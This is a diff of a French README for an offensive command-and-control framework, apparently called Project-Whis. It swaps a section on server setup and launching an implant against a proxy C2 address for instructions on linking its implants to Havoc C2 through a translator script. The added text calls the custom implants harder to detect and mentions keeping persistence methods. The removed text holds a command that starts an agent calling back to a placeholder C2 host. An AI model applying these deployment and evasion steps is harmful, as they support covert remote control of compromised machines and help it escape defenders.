@@ -89,25 +89,20 @@ Ces outils étendent les capacités de l'agent lors des phases de post-exploitat
 
 ---
 
-## 8. Automatisation du Déploiement
+## 9. Intégration Havoc C2 (Architecture Recommandée)
 
-### 8.1 Configuration Automatique du Serveur
-Le serveur C2 initialise désormais sa propre base de données au démarrage.
-1. Installez MySQL et créez une DB vide.
-2. Renseignez `C2/config.toml`.
-3. Lancez le serveur : `./c2_server`. 
-   *   Toutes les tables (`linux_clients`, `windows_clients`, etc.) seront créées automatiquement.
-   *   Un compte admin par défaut est créé : `admin` / `password`.
+Pour une utilisation professionnelle, il est recommandé d'utiliser **Havoc C2** comme serveur de contrôle et les agents **Project-Whis** comme implants.
 
-### 8.2 Utilisation avec Proxychains (Connectivité Dynamique)
-Si votre serveur est derrière un proxy (via `proxychains`) ou un VPN, l'agent doit connaître l'IP publique de votre sortie de proxy.
+### 9.1 Fonctionnement du Traducteur
+Le framework inclut un script `Havoc-Integration/WhisTranslator.py`. Ce script agit comme un pont :
+1.  **Agents** <--- (HTTP/XXTea) ---> **Translator** <--- (Havoc API) ---> **Havoc Teamserver**
 
-**Option 1 : Compilation fixe**
-Modifiez `C2` dans `Clients/HTTPS/Linux/core/Config.go` avant le build.
+### 9.2 Avantages
+*   **Implant Custom** : Havoc ne connaît pas nativement les agents Project-Whis, ce qui les rend plus difficiles à détecter que le démon standard (Demon).
+*   **Post-Exploitation Havoc** : Profitez de la puissance de Havoc (Token manipulation, Tasking, UI) tout en gardant vos méthodes de persistance Linux/MIPS.
 
-**Option 2 : Surcharge Dynamique (Recommandé pour les tests)**
-Lancez l'agent en spécifiant l'IP du proxy via une variable d'environnement :
-```bash
-C2_URL=https://IP_DU_PROXY:8080 ./agent_linux
-```
-L'agent ignorera les URLs codées en dur et se connectera directement à votre passerelle.
+### 9.3 Installation de l'Intégration
+1.  Installez Havoc C2.
+2.  Dans le dossier `Havoc-Integration`, installez la dépendance : `pip install xxtea-py`.
+3.  Lancez le traducteur : `python3 WhisTranslator.py`.
+4.  Configurez vos agents avec l'IP du traducteur comme URL C2.
